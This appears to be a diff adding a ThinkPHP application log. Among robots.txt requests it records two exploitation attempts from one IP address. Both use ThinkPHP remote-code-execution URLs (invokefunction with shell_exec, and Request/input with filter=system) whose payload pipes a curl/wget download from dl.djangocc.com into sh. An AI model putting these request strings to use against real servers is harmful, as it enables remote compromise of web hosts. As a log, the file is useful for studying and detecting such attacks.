@@ -1,0 +1,30 @@
+[ 2019-08-21T00:47:34+08:00 ] 3.214.21.251 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000183s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-08-21T03:59:13+08:00 ] 207.46.13.16 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000181s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-08-21T12:42:04+08:00 ] 134.119.8.163 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=(curl%20-fsSL%20-m180%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22%7C%7Cwget%20-q%20-T180%20-O-%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22)%7Csh
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000191s ]
+ERR: 无法加载模块:Index
+
+[ 2019-08-21T12:42:09+08:00 ] 134.119.8.163 /index.php?s=index/index/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000199s ]
+ERR: 无法加载模块:Index
+
+[ 2019-08-21T12:42:12+08:00 ] 134.119.8.163 /?s=index/%09hink%5CRequest/input&filter=system&data=(curl%20-fsSL%20-m180%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22%7C%7Cwget%20-q%20-T180%20-O-%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22)%7Csh
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000213s ]
+ERR: 无法加载模块:Index
+
